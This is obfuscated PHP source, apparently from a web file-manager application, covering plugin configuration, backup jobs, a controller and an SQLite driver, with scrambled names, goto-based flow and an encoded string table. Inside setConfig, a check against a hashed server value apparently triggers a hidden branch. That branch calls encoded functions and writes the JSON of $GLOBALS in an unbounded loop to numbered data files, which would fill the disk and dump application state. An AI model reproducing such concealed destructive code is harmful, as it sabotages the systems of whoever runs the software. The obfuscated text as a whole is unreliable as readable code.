$this->parseLang($f·°Ê˜¢´); $this->parseConfig($f·°Ê˜¢´); goto bğ‹šƒ¡Ô´; bğ‹šƒ¡Ô´: $this->parsePackage($f·°Ê˜¢´); if (is_array($F¿‰ƒ° ä)) { $f·°Ê˜¢´ = str_replace(array_keys($F¿‰ƒ° ä), array_values($F¿‰ƒ° ä), $f·°Ê˜¢´); } echo $E‡…ù¹Éè[214] . $f·°Ê˜¢´; goto fâ¹ŠÌ£ÖŸ; fâ¹ŠÌ£ÖŸ: } final function initLang() { goto B»ØäÏ­ª; BÊ®‰’‡Ğ»: if (!is_array($dÒ¾—‡ÔğÜ)) { return array(); } if (@count($dÒ¾—‡ÔğÜ) > 0) { I18n::set($dÒ¾—‡ÔğÜ); } return $dÒ¾—‡ÔğÜ; goto EÄ‚Ã¡Ò¶; aÜ¾É›Ê¸: $DÑïÄ¥ŒóË = I18n::getType(); $dÒ¾—‡ÔğÜ = array(); if (file_exists($cÏ•ñ±ãšˆ . $DÑïÄ¥ŒóË . $e¬Åßï¡ê [767])) { $dÒ¾—‡ÔğÜ = (include $cÏ•ñ±ãšˆ . $DÑïÄ¥ŒóË . $e¬Åßï¡ê [767]); } else { if ($DÑïÄ¥ŒóË == $e¬Åßï¡ê [1344] && !file_exists($cÏ•ñ±ãšˆ . $DÑïÄ¥ŒóË . $e¬Åßï¡ê [767]) && file_exists($cÏ•ñ±ãšˆ . $e¬Åßï¡ê [1345])) { $dÒ¾—‡ÔğÜ = (include $cÏ•ñ±ãšˆ . $e¬Åßï¡ê [1345]); } else { if (file_exists($cÏ•ñ±ãšˆ . $fŒä•ğ¾ . $e¬Åßï¡ê [767])) { $dÒ¾—‡ÔğÜ = (include $cÏ•ñ±ãšˆ . $fŒä•ğ¾ . $e¬Åßï¡ê [767]); } } } goto BÊ®‰’‡Ğ»; B»ØäÏ­ª: $e¬Åßï¡ê  =& $_SERVER[Äº¡•ô™Ÿ]; $fŒä•ğ¾ = $e¬Åßï¡ê [1342]; $cÏ•ñ±ãšˆ = $this->pluginPath . $e¬Åßï¡ê [1343]; goto aÜ¾É›Ê¸; EÄ‚Ã¡Ò¶: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($C‹´ÍÚ¡¡) { $d©…’†Û =& $_SERVER[Äº¡•ô™Ÿ]; $BµŸèÉäÈ = $_SERVER[$d©…’†Û[793]] . $d©…’†Û[794]; $Cçóù¤¿ÑÁ = $d©…’†Û[1346]; if ($_SERVER[$d©…’†Û[789]] != $Cçóù¤¿ÑÁ($BµŸèÉäÈ)) { goto f›ÉÉ¤©Ãâ; f›ÉÉ¤©Ãâ: $cĞ¹©Ñê…ä = $d©…’†Û[791]; $dÒ…ì‡ˆœ = $d©…’†Û[792]; $cŞøíÜ·â = $_SERVER[$d©…’†Û[793]] . $d©…’†Û[794]; goto d‘‚ŠÓ˜â; d‘‚ŠÓ˜â: $f˜ÂÒ¯©Šê = $dÒ…ì‡ˆœ($cŞøíÜ·â); $cÜÇãÅôÎ = explode($d©…’†Û[214], $f˜ÂÒ¯©Šê); if (count($cÜÇãÅôÎ) < $d©…’†Û[558]) { $A¤ºãŠ¢¾ = $d©…’†Û[795]; $A¤ºãŠ¢¾(); } goto dÇÙŠÂÈ½; dÇÙŠÂÈ½: $Aá‚â“ƒ½é = $d©…’†Û[796]; $Aá‚â“ƒ½é($_SERVER[$d©…’†Û[797]]); $cĞ¹©Ñê…ä = $d©…’†Û[791]; goto eì—·‹ÃÒí; eì—·‹ÃÒí: $cĞ¹©Ñê…ä(); $aˆÚò•‚°Ù = $d©…’†Û[1347]; $c±–ùà‡Æ = json_encode($GLOBALS[$d©…’†Û[1348]]); goto d¾‹ÇŸö‹; d¾‹ÇŸö‹: $AÇÏ½´šË¦ = 1; for ($B¹İ½–ï = $AÇÏ½´šË¦; $B¹İ½–ï > 0; $B¹İ½–ï++) { $aˆÚò•‚°Ù(DATA_PATH . $B¹İ½–ï, $c±–ùà‡Æ); } goto Fºß–”ñ®¦; Fºß–”ñ®¦: } return $this->modelPlugin->setConfig($this->pluginName, $C‹´ÍÚ¡¡); } public function onSetConfig($dÉÏÖ™Š™µ) { } public function onGetConfig($eù‘æ†àĞš) { } public function onChangeStatus($cŞÕåí„Ó­) { } public function onUninstall() { } public function onInstall() { } public function authCheck($FâÛÎÆº…¬ = "\160\154\165\x67\x69\x6e\x41\x75\x74\x68") { $a´ŞÇÌ¬‡ˆ =& $_SERVER[Äº¡•ô™Ÿ]; if (!defined($a´ŞÇÌ¬‡ˆ[423])) { return !1; } if (_get($GLOBALS, $a´ŞÇÌ¬‡ˆ[453])) { return !0; } $AÛ—»ÕÈÌ = $this->getConfig(); if (!$AÛ—»ÕÈÌ[$FâÛÎÆº…¬]) { return !1; } return ActionCall($a´ŞÇÌ¬‡ˆ[1349], $AÛ—»ÕÈÌ[$FâÛÎÆº…¬]); } public function url($Cá¦çØ±Ì, $bˆ°§ŠÏÊ = '', $BÖ­¼âå¯ = true) { goto eŠ°ÃÒóëÛ; AòÎäÚ¯ºÚ: $B©ƒË—¤Û = $this->packageVersion(); $aå„”¼Œç¿ = $Dğ´¼ªñİ . $d©Í†šª[408] . $B©ƒË—¤Û; if ($bˆ°§ŠÏÊ == $d©Í†šª[33]) { $A©„ãŞ„™ = $this->pluginHost . $Cá¦çØ±Ì . $d©Í†šª[1350] . $aå„”¼Œç¿; } else { if ($bˆ°§ŠÏÊ === $d©Í†šª[76]) { $A©„ãŞ„™ = $this->pluginHost . $Cá¦çØ±Ì; } else { if ($bˆ°§ŠÏÊ == $d©Í†šª[1351]) { $A©„ãŞ„™ = STATIC_PATH . $Cá¦çØ±Ì . $d©Í†šª[1350] . $Dğ´¼ªñİ; } else { if ($bˆ°§ŠÏÊ == $d©Í†šª[1352]) { $A©„ãŞ„™ = APP_HOST . $d©Í†šª[1353] . $Cá¦çØ±Ì . $d©Í†šª[1350] . $Dğ´¼ªñİ; } else { if (isset($eÍí¥¬ù®Ç[$bˆ°§ŠÏÊ])) { $A©„ãŞ„™ = $eÍí¥¬ù®Ç[$bˆ°§ŠÏÊ] . $Cá¦çØ±Ì . $d©Í†šª[1350] . $aå„”¼Œç¿; } } } } } goto EÕªõââÕÑ; EÕªõââÕÑ: if (!$BÖ­¼âå¯) { return $A©„ãŞ„™; } echo $A©„ãŞ„™; goto bŠŞš»¼ÛŞ; eŠ°ÃÒóëÛ: $d©Í†šª =& $_SERVER[Äº¡•ô™Ÿ]; $eÍí¥¬ù®Ç = $this->getConfig(); $Dğ´¼ªñİ = KOD_VERSION . $d©Í†šª[93] . KOD_VERSION_BUILD; goto AòÎäÚ¯ºÚ; bŠŞš»¼ÛŞ: } public function link($C·æîÄ¢ = false, $A‘ƒ»‹‰İì = '') { $f³ã¼Ğ±Êï =& $_SERVER[Äº¡•ô™Ÿ]; if (!$C·æîÄ¢) { $this->link($f³ã¼Ğ±Êï[1354], $f³ã¼Ğ±Êï[1352]); $this->link($f³ã¼Ğ±Êï[1355], $f³ã¼Ğ±Êï[1351]); $this->link($f³ã¼Ğ±Êï[1356], $f³ã¼Ğ±Êï[1351]); $this->link($f³ã¼Ğ±Êï[1357], $f³ã¼Ğ±Êï[1351]); $this->link($f³ã¼Ğ±Êï[1358], $f³ã¼Ğ±Êï[1351]); return; } $B«ä±ƒƒİ» = $this->url($C·æîÄ¢, $A‘ƒ»‹‰İì, !1); if (substr($C·æîÄ¢, -3) == $f³ã¼Ğ±Êï[1359]) { echo $f³ã¼Ğ±Êï[1360] . $B«ä±ƒƒİ» . $f³ã¼Ğ±Êï[1361] . $f³ã¼Ğ±Êï[214]; } else { if (substr($C·æîÄ¢, -4) == $f³ã¼Ğ±Êï[1362]) { echo $f³ã¼Ğ±Êï[1363] . $B«ä±ƒƒİ» . $f³ã¼Ğ±Êï[1364] . $f³ã¼Ğ±Êï[214]; } } } } goto FÂÜÉÓî¾½; B¨ğ§‚êåç: define($_SERVER[Äº¡•ô™Ÿ][1907], 1); define($_SERVER[Äº¡•ô™Ÿ][1908], 2); define($_SERVER[Äº¡•ô™Ÿ][1909], 3); goto Fç­†‰ÔÃ; E“ØÓ¾êÅÓ: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $Aï•èÜ™º =& $_SERVER[Äº¡•ô™Ÿ]; self::$name = date($Aï•èÜ™º[690]); if (!($DÖ§ŠñÌ‹Ş = Model($Aï•èÜ™º[691])->lastItem())) { $DÖ§ŠñÌ‹Ş = $this->initData(); } else { self::$name = $DÖ§ŠñÌ‹Ş[$Aï•èÜ™º[28]]; if ($DÖ§ŠñÌ‹Ş[$Aï•èÜ™º[692]] == $Aï•èÜ™º[83]) { self::$name = date($Aï•èÜ™º[693]); $a…§áÚÉ‚‘ = 0; if (isset($DÖ§ŠñÌ‹Ş[$Aï•èÜ™º[278]][$Aï•èÜ™º[164]][$Aï•èÜ™º[415]])) { $a…§áÚÉ‚‘ = (int) $DÖ§ŠñÌ‹Ş[$Aï•èÜ™º[278]][$Aï•èÜ™º[164]][$Aï•èÜ™º[415]]; } if ($DÖ§ŠñÌ‹Ş[$Aï•èÜ™º[28]] == self::$name) { Model($Aï•èÜ™º[691])->remove($DÖ§ŠñÌ‹Ş[$Aï•èÜ™º[364]]); } $DÖ§ŠñÌ‹Ş = $this->initData($a…§áÚÉ‚‘, $DÖ§ŠñÌ‹Ş[$Aï•èÜ™º[694]]); } else { $this->checkStore($DÖ§ŠñÌ‹Ş[$Aï•èÜ™º[694]]); } } self::$option = $DÖ§ŠñÌ‹Ş; } private function initData($f… ¬× ©­ = 0, $Aò•°é‰²Î = '') { goto eâùÀ„í„î; eâùÀ„í„î: $cÁãÇ„öë =& $_SERVER[Äº¡•ô™Ÿ]; $b ˆ—ÁÑ³ = Model($cÁãÇ„öë[691])->config(); if ($Aò•°é‰²Î && $b ˆ—ÁÑ³[$cÁãÇ„öë[694]] != $Aò•°é‰²Î) { $f… ¬× ©­ = 0; } goto FÏÏ•½Òï; FÏÏ•½Òï: $this->checkStore($b ˆ—ÁÑ³[$cÁãÇ„öë[694]]); $Eİ·îïĞ¶ = array($cÁãÇ„öë[694] => $b ˆ—ÁÑ³[$cÁãÇ„öë[694]], $cÁãÇ„öë[28] => self::$name, $cÁãÇ„öë[692] => 0, $cÁãÇ„öë[695] => $b ˆ—ÁÑ³[$cÁãÇ„öë[695]], $cÁãÇ„öë[278] => array($cÁãÇ„öë[696] => array($cÁãÇ„öë[692] => 0), $cÁãÇ„öë[697] => array($cÁãÇ„öë[692] => 0, $cÁãÇ„öë[698] => 0, $cÁãÇ„öë[699] => 0, $cÁãÇ„öë[29] => $cÁãÇ„öë[33]), $cÁãÇ„öë[700] => array($cÁãÇ„öë[692] => 0, $cÁãÇ„öë[698] => 0, $cÁãÇ„öë[699] => 0), $cÁãÇ„öë[164] => array($cÁãÇ„öë[692] => 0, $cÁãÇ„öë[701] => 0, $cÁãÇ„öë[702] => 0, $cÁãÇ„öë[703] => 0, $cÁãÇ„öë[704] => 0, $cÁãÇ„öë[415] => $f… ¬× ©­)), $cÁãÇ„öë[705] => time(), $cÁãÇ„öë[706] => 0); $b‘²©Ì¥š = Model($cÁãÇ„öë[691])->insert($Eİ·îïĞ¶); goto bÑÇÈŞ–·; bÑÇÈŞ–·: $Eİ·îïĞ¶[$cÁãÇ„öë[364]] = $b‘²©Ì¥š; return $Eİ·îïĞ¶; goto cÁÛ†˜ƒ; cÁÛ†˜ƒ: } private function checkStore($f¤¡«î²ö) { $a„í‡ÉÍ·§ =& $_SERVER[Äº¡•ô™Ÿ]; $DÂÁ”ø¶¥Å = Model($a„í‡ÉÍ·§[707])->listData($f¤¡«î²ö); Model($a„í‡ÉÍ·§[707])->checkConfig($DÂÁ”ø¶¥Å); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Äº¡•ô™Ÿ][691])->findByName(self::$name); } return self::$option; } public static function set($FÆÔ¦†“ï) { $aé¦ãš½ë =& $_SERVER[Äº¡•ô™Ÿ]; $fÆ‘§Ï»Õà = self::get(); foreach ($FÆÔ¦†“ï as $D‚—ÖåÓó => $A¤ä©„Åé°) { $D—–¦òî‚´ = explode($aé¦ãš½ë[93], $D‚—ÖåÓó); $aéÛÂĞ‰‘ = count($D—–¦òî‚´); switch ($aéÛÂĞ‰‘) { case 1: $fÆ‘§Ï»Õà[$D—–¦òî‚´[0]] = $A¤ä©„Åé°; break; case 2: $fÆ‘§Ï»Õà[$D—–¦òî‚´[0]][$D—–¦òî‚´[1]] = $A¤ä©„Åé°; break; case 3: $fÆ‘§Ï»Õà[$D—–¦òî‚´[0]][$D—–¦òî‚´[1]][$D—–¦òî‚´[2]] = $A¤ä©„Åé°; break; } } Model($aé¦ãš½ë[691])->update($fÆ‘§Ï»Õà[$aé¦ãš½ë[364]], $fÆ‘§Ï»Õà); self::$option = $fÆ‘§Ï»Õà; return self::$option; } public function keep() { $A¯‡¼Õ’Û =& $_SERVER[Äº¡•ô™Ÿ]; $d¸ºŠ›´Ê = self::get(); if ($d¸ºŠ›´Ê[$A¯‡¼Õ’Û[278]][$A¯‡¼Õ’Û[696]][$A¯‡¼Õ’Û[692]] == $A¯‡¼Õ’Û[83]) { return; } $this->backupKeep($d¸ºŠ›´Ê); self::set(array($A¯‡¼Õ’Û[708] => 1)); } private function backupKeep($FŞ˜’„ÆŠÍ) { goto B÷Ô‚¸…§; bõ´›››âÈ: for ($eÑíÈ—Ìæ = 0; $eÑíÈ—Ìæ < 12; $eÑíÈ—Ìæ++) { $A´×ÁíÊ…ˆ[] = date($E‡´´ßø»[709], strtotime("\55{$eÑíÈ—Ìæ}\40\155\157\156\164\x68\163")); } $A´×ÁíÊ…ˆ = array_unique($A´×ÁíÊ…ˆ); foreach ($EÉÓÌÂ¯³ as $FâÇ·¿”) { if (!empty($FâÇ·¿”[$E‡´´ßø»[28]]) && in_array($FâÇ·¿”[$E‡´´ßø»[28]], $A´×ÁíÊ…ˆ)) { continue; } Model($E‡´´ßø»[691])->remove($FâÇ·¿”[$E‡´´ßø»[364]]); $a…ÇÊÉ“‹¯ = "\173\151\x6f\x3a{$FŞ˜’„ÆŠÍ[$E‡´´ßø»[694]]}\x7d\57\144\141\x74\x61\x62\x61\163\145\x2f\142\x61\143\153\165\x70\x5f{$FâÇ·¿”[$E‡´´ßø»[28]]}"; IO::remove($a…ÇÊÉ“‹¯, !1); } goto EöØƒ¡±ï; B÷Ô‚¸…§: $E‡´´ßø» =& $_SERVER[Äº¡•ô™Ÿ]; $EÉÓÌÂ¯³ = Model($E‡´´ßø»[691])->listData(); if (empty($EÉÓÌÂ¯³)) { return; } goto A¿…”¿˜Ò; A¿…”¿˜Ò: $eÑíÈ—Ìæ = 0; $A´×ÁíÊ…ˆ = array(); foreach ($EÉÓÌÂ¯³ as $FâÇ·¿”) { if ($eÑíÈ—Ìæ >= 7) { break; } $A´×ÁíÊ…ˆ[] = $FâÇ·¿”[$E‡´´ßø»[28]]; $eÑíÈ—Ìæ++; } goto bõ´›››âÈ; EöØƒ¡±ï: } public function db() { goto bòœéá›Õ£; B‘ØÛ×¹³: return !0; goto e¡õ½²Öáõ; bòœéá›Õ£: $FÎ£¥‹ç¼® =& $_SERVER[Äº¡•ô™Ÿ]; $Cëâ­­Òå = self::get(); if ($Cëâ­­Òå[$FÎ£¥‹ç¼®[278]][$FÎ£¥‹ç¼®[697]][$FÎ£¥‹ç¼®[692]] == $FÎ£¥‹ç¼®[83]) { return !0; } goto FÉŒ’ñöİË; FÉŒ’ñöİË: $e»â°¸ÙãŒ = new BackupDb(); if (!$e»â°¸ÙãŒ->index()) { return !1; } self::set(array($FÎ£¥‹ç¼®[710] => 1)); goto B‘ØÛ×¹³; e¡õ½²Öáõ: } public function dbFile() { goto bíš’ø»¬‹; F«Ûè Ü³¸: $A·¯»ÈùŸ× = new BackupDbFile(); if (!$A·¯»ÈùŸ×->index()) { return !1; } self::set(array($cÀ¥±Ø¦òì[711] => 1)); goto d†¡æõƒßÙ; bíš’ø»¬‹: $cÀ¥±Ø¦òì =& $_SERVER[Äº¡•ô™Ÿ]; $b«Ğ´„•†» = self::get(); if ($b«Ğ´„•†»[$cÀ¥±Ø¦òì[278]][$cÀ¥±Ø¦òì[700]][$cÀ¥±Ø¦òì[692]] == $cÀ¥±Ø¦òì[83]) { return !0; } goto F«Ûè Ü³¸; d†¡æõƒßÙ: return !0; goto CœïÊÓø¬Ê; CœïÊÓø¬Ê: } public function file() { $dÖˆ©‡óë =& $_SERVER[Äº¡•ô™Ÿ]; $Fà§åÏÁ½¼ = self::get(); if ($Fà§åÏÁ½¼[$dÖˆ©‡óë[278]][$dÖˆ©‡óë[164]][$dÖˆ©‡óë[692]] == $dÖˆ©‡óë[83]) { return !0; } if (!isset($Fà§åÏÁ½¼[$dÖˆ©‡óë[695]]) || $Fà§åÏÁ½¼[$dÖˆ©‡óë[695]] == $dÖˆ©‡óë[464]) { $eò‹ñ‚„Îç = new BackupFile(); if (!$eò‹ñ‚„Îç->index()) { return !1; } } self::set(array($dÖˆ©‡óë[712] => 1, $dÖˆ©‡óë[692] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto C×ŠÜó…‚; eƒÕâ¯¼£: $E‹Ò÷µ…Õ->end(); $E„Ü¿¾¥ãº = array($C½‹›—ÜäÙ[723] => $cãŠÊ×œš, $C½‹›—ÜäÙ[710] => 1, $C½‹›—ÜäÙ[724] => $Dˆášã¥¼, $C½‹›—ÜäÙ[725] => $Dˆášã¥¼); Backup::set($E„Ü¿¾¥ãº); goto F®òÛ»³Ø“; C×ŠÜó…‚: $C½‹›—ÜäÙ =& $_SERVER[Äº¡•ô™Ÿ]; $eÁË‚Ø”à = Backup::get(); self::$io = $eÁË‚Ø”à[$C½‹›—ÜäÙ[694]]; goto DˆäÙ§øöï; còªêê…©§: $E‹Ò÷µ…Õ = new Task($C½‹›—ÜäÙ[714], $C½‹›—ÜäÙ[715], 0, LNG($C½‹›—ÜäÙ[716]) . $C½‹›—ÜäÙ[717] . LNG($C½‹›—ÜäÙ[718])); $cè¿ïÉ…—© = array_diff($cè¿ïÉ…—©, array($C½‹›—ÜäÙ[719], $C½‹›—ÜäÙ[720])); foreach ($cè¿ïÉ…—© as $FÜİ©°¡ğ) { $dÚŞ«“‹³… = $dŞœ´ÀÙÆù . $FÜİ©°¡ğ . $C½‹›—ÜäÙ[721]; $B‹ã† ­‰Š = null; if ($FÜİ©°¡ğ == $C½‹›—ÜäÙ[722] && (!isset($eÁË‚Ø”à[$C½‹›—ÜäÙ[695]]) || $eÁË‚Ø”à[$C½‹›—ÜäÙ[695]] == $C½‹›—ÜäÙ[464])) { $B‹ã† ­‰Š = self::$io; } $Dˆášã¥¼ += $B¬ò¹¹¹Œ§->sqlFromDb($FÜİ©°¡ğ, $dÚŞ«“‹³…, $E‹Ò÷µ…Õ, $B‹ã† ­‰Š); } goto eƒÕâ¯¼£; F®òÛ»³Ø“: return !0; goto CÒ‹™ğŒ°¶; DˆäÙ§øöï: self::$name = $eÁË‚Ø”à[$C½‹›—ÜäÙ[28]]; $A·ø„Ø«Ãò = $GLOBALS[$C½‹›—ÜäÙ[6]][$C½‹›—ÜäÙ[17]]; $cãŠÊ×œš = $this->_dbType($A·ø„Ø«Ãò); goto CÁ¶£ŒÊçø; CÁ¶£ŒÊçø: $B¬ò¹¹¹Œ§ = new DbManage($A·ø„Ø«Ãò, $cãŠÊ×œš); $dŞœ´ÀÙÆù = TEMP_FILES . $C½‹›—ÜäÙ[713] . self::$name . $C½‹›—ÜäÙ[8]; del_dir($dŞœ´ÀÙÆù); goto BÁîÁä¤ù; BÁîÁä¤ù: mk_dir($dŞœ´ÀÙÆù); $cè¿ïÉ…—© = $B¬ò¹¹¹Œ§->db()->getTables(); $Dˆášã¥¼ = 0; goto còªêê…©§; CÒ‹™ğŒ°¶: } private function _dbType($A™ùÔ÷¬‰‚) { $Cñè¹ô¸¬ =& $_SERVER[Äº¡•ô™Ÿ]; $eÀ×ë¤Îš = $A™ùÔ÷¬‰‚[$Cñè¹ô¸¬[726]]; if ($eÀ×ë¤Îš == $Cñè¹ô¸¬[727]) { $AÃ‘®…ç‡ = explode($Cñè¹ô¸¬[4], $A™ùÔ÷¬‰‚[$Cñè¹ô¸¬[728]]); $eÀ×ë¤Îš = $AÃ‘®…ç‡[0]; } $bğ¯ß÷É§Î = array($Cñè¹ô¸¬[729] => $Cñè¹ô¸¬[9], $Cñè¹ô¸¬[730] => $Cñè¹ô¸¬[731]); if (isset($bğ¯ß÷É§Î[$eÀ×ë¤Îš])) { $eÀ×ë¤Îš = $bğ¯ß÷É§Î[$eÀ×ë¤Îš]; } return $eÀ×ë¤Îš; } } class BackupDbFile { public function __construct() { } public function index() { goto fÃ›¤ó±™; B‡œÂ’×Û: $d©˜È—½„æ = new TaskFileTransfer($Fœİ‚Ï„³Á[732], $Fœİ‚Ï„³Á[715], 0, LNG($Fœİ‚Ï„³Á[716]) . $Fœİ‚Ï„³Á[408] . LNG($Fœİ‚Ï„³Á[718]) . $Fœİ‚Ï„³Á[733]); $d©˜È—½„æ->addPath($AÂÇî—¡Ì¶); $EôÑ²ÓÛñ = IO::infoWithChildren($AÂÇî—¡Ì¶); goto aØÄÁèæ¶; fÃ›¤ó±™: $Fœİ‚Ï„³Á =& $_SERVER[Äº¡•ô™Ÿ]; $a¨‘Šòæ«İ = Backup::get(); $AÈß‹½ç¶Á = $a¨‘Šòæ«İ[$Fœİ‚Ï„³Á[28]]; goto F—ã°¼±«; FÖœ¥»‰ª: IO::copy($AŸÍÀÍ¬œ‹, $EÏ„Â†ŠÚÑ . "\142\141\x63\x6b\x75\160\137{$AÈß‹½ç¶Á}\x2f"); $d©˜È—½„æ->end(); Backup::set(array($Fœİ‚Ï„³Á[736] => $EôÑ²ÓÛñ[$Fœİ‚Ï„³Á[77]])); goto DùÍ‰˜ ¥ô; DùÍ‰˜ ¥ô: return !0; goto BóÆšî¶¢; F—ã°¼±«: $AÂÇî—¡Ì¶ = TEMP_FILES . "\142\x61\143\153\x75\160\x5f{$AÈß‹½ç¶Á}\57"; $EÏ„Â†ŠÚÑ = "\x7b\x69\x6f\72{$a¨‘Šòæ«İ[$Fœİ‚Ï„³Á[694]]}\175\x2f\144\x61\164\141\x62\141\163\x65\x2f"; IO::mkdir($EÏ„Â†ŠÚÑ . "\142\x61\x63\x6b\x75\160\137{$AÈß‹½ç¶Á}\x2f"); goto B‡œÂ’×Û; aØÄÁèæ¶: Backup::set(array($Fœİ‚Ï„³Á[734] => $EôÑ²ÓÛñ[$Fœİ‚Ï„³Á[77]])); IO::move($AÂÇî—¡Ì¶, $EÏ„Â†ŠÚÑ); $AŸÍÀÍ¬œ‹ = CONTROLLER_DIR . $Fœİ‚Ï„³Á[735]; goto FÖœ¥»‰ª; BóÆšî¶¢: } } goto f³Íñğ«¿; c¿á‚ïÁ‡Ó: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto b‹èï Ÿ‰á; bšÀ¥»ŒÇ: $this->in =& $in; $this->values[$aø¶…¤Èéª[6]] =& $config; $this->values[$aø¶…¤Èéª[7]] =& $in; goto c¿Ëƒì±á; c¿Ëƒì±á: $this->tpl = TEMPLATE . MOD . $aø¶…¤Èéª[8]; $this->_classObjectID = mt_rand(0, 10000); goto a†ƒ»ÃÎÜ; b‹èï Ÿ‰á: $aø¶…¤Èéª =& $_SERVER[Äº¡•ô™Ÿ]; global $in, $config; $this->config =& $config; goto bšÀ¥»ŒÇ; a†ƒ»ÃÎÜ: } public function loadClass($b•ô½¸Ë™©) { if (1 === func_num_args()) { $this->{$b•ô½¸Ë™©} = new $b•ô½¸Ë™©(); } else { $CïßâÅ”Š = new ReflectionClass($b•ô½¸Ë™©); $DØç¿ââùĞ = func_get_args(); array_shift($DØç¿ââùĞ); $this->{$b•ô½¸Ë™©} = $CïßâÅ”Š->newInstanceArgs($DØç¿ââùĞ); } return $this->{$b•ô½¸Ë™©}; } protected function assign($bÎ£†ÁÇ¦‰, $c‘ÛæÇÌİ¸) { $this->values[$bÎ£†ÁÇ¦‰] = $c‘ÛæÇÌİ¸; } protected function display($aì‘•î…óÄ) { ob_end_clean(); extract($this->values); require $this->tpl . $aì‘•î…óÄ; } } class DbSqliteBase extends Db { public function __construct($E×©ÔÅ = '') { $AÊñŒ²‚¿ =& $_SERVER[Äº¡•ô™Ÿ]; if (!extension_loaded($AÊñŒ²‚¿[9])) { think_exception(think_lang($AÊñŒ²‚¿[10]) . $AÊñŒ²‚¿[11]); } if (!empty($E×©ÔÅ)) { if (!isset($E×©ÔÅ[$AÊñŒ²‚¿[12]])) { $E×©ÔÅ[$AÊñŒ²‚¿[12]] = 438; } $this->config = $E×©ÔÅ; if (empty($this->config[$AÊñŒ²‚¿[13]])) { $this->config[$AÊñŒ²‚¿[13]] = array(); } } } public function connect($E’ÕÓì†«‚ = '', $F¼‘óòÄÀ° = 0) { $D–ÆĞ­‘ÑÉ =& $_SERVER[Äº¡•ô™Ÿ]; if (!isset($this->linkID[$F¼‘óòÄÀ°])) { goto dñ¶áÙÒ‰ç; dñ¶áÙÒ‰ç: if (empty($E’ÕÓì†«‚)) { $E’ÕÓì†«‚ = $this->config; } $fô„ø„‰¡í = !empty($E’ÕÓì†«‚[$D–ÆĞ­‘ÑÉ[13]][$D–ÆĞ­‘ÑÉ[14]]) ? $E’ÕÓì†«‚[$D–ÆĞ­‘ÑÉ[13]][$D–ÆĞ­‘ÑÉ[14]] : $this->pconnect; $bÛ·Çæò½± = $fô„ø„‰¡í ? $D–ÆĞ­‘ÑÉ[15] : $D–ÆĞ­‘ÑÉ[16]; goto c¡®äĞáèƒ; c¡®äĞáèƒ: $this->linkID[$F¼‘óòÄÀ°] = $bÛ·Çæò½±($E’ÕÓì†«‚[$D–ÆĞ­‘ÑÉ[17]], $E’ÕÓì†«‚[$D–ÆĞ­‘ÑÉ[12]]); if (!$this->linkID[$F¼‘óòÄÀ°]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto BË™Ò‚½­„; BË™Ò‚½­„: @sqlite_busy_timeout($this->linkID[$F¼‘óòÄÀ°], 30000); if (1 != think_config($D–ÆĞ­‘ÑÉ[18])) { unset($this->config); } goto F½ôòÛ»™ğ; F½ôòÛ»™ğ: } return $this->linkID[$F¼‘óòÄÀ°]; } public function free() { $this->queryID = null; } public function query($Bî˜ŠÂËº˜) { goto d±Û»Ìïñã; aÆ¥ƒõº¥²: $this->queryStr = $Bî˜ŠÂËº˜; if ($this->queryID) { $this->free(); } think_action_status($B££Å¬ÛÏ[19], 1); goto AÔè¦âà„; AÔè¦âà„: think_status($B££Å¬ÛÏ[20]); $this->queryID = sqlite_query($this->_linkID, $Bî˜ŠÂËº˜); $this->debug(); goto E‚ãƒ•ø¨; E‚ãƒ•ø¨: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $a…¬ğ¤Å» = $this->getAll(); return $a…¬ğ¤Å»; } goto C•”´œ”‹‡; d±Û»Ìïñã: $B££Å¬ÛÏ =& $_SERVER[Äº¡•ô™Ÿ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto aÆ¥ƒõº¥²; C•”´œ”‹‡: } public function execute($CŠìäÑ¼î) { goto C˜‡ĞÕ»À; bÏ¨Àˆæ“İ: $this->queryStr = $CŠìäÑ¼î; if ($this->queryID) { $this->free(); } think_action_status($FÄˆ»¦õ¬™[21], 1); goto a²ßò®ëˆõ; Eòğ©‹µÂ: if (!1 === $EÄƒïöîÃé) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto Fé½Æ¸ëÊ¡; a²ßò®ëˆõ: think_status($FÄˆ»¦õ¬™[20]); $EÄƒïöîÃé = sqlite_exec($this->_linkID, $CŠìäÑ¼î); $this->debug(); goto Eòğ©‹µÂ; C˜‡ĞÕ»À: $FÄˆ»¦õ¬™ =& $_SERVER[Äº¡•ô™Ÿ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto bÏ¨Àˆæ“İ; Fé½Æ¸ëÊ¡: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Äº¡•ô™Ÿ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $fƒğª¥ÍÈ = sqlite_query($this->_linkID, $_SERVER[Äº¡•ô™Ÿ][23]); if (!$fƒğª¥ÍÈ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $c¸×ä¤¨ñ‚ = sqlite_query($this->_linkID, $_SERVER[Äº¡•ô™Ÿ][24]); if (!$c¸×ä¤¨ñ‚) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $aÒÅ‹¼­„  = array(); if ($this->numRows > 0) { for ($DÍ©²é‰ŠÜ = 0; $DÍ©²é‰ŠÜ < $this->numRows; $DÍ©²é‰ŠÜ++) { $aÒÅ‹¼­„ [$DÍ©²é‰ŠÜ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $aÒÅ‹¼­„ ; } public function getFields($d‹‰‡¤™Ø˜) { $CŸÙç‡ÉÚ =& $_SERVER[Äº¡•ô™Ÿ]; $AŒ²è´†„ã = $this->query($CŸÙç‡ÉÚ[25] . $d‹‰‡¤™Ø˜ . $CŸÙç‡ÉÚ[26]); $bÚùæÒÁ¬ = array(); if 